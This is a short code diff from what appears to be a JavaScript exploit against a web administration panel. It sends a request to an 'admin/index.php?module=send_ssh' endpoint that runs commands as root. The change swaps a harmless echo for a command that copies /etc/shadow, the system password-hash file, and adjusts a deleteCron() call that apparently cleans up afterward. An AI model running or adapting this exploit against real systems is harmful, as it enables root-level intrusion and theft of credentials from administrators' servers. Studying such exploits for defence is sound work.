@@ -70,7 +70,7 @@ function ExecCmd()
 	var uri = "/"+ token + "/admin/index.php?module=send_ssh";
 
 	// The following command will be executed as root
-	var cmd  = 'echo "I can create a root user if I want :)" > /root/hola.txt';
+	var cmd  = "cat /etc/shadow > /root/hola.txt";
 
 
 	xhr = new XMLHttpRequest();
@@ -99,7 +99,7 @@ function ExecCmd()
 			xhr.send(body);
 		}
 	}
-  deleteCron();
 }
 
 ExecCmd();
+deleteCron();
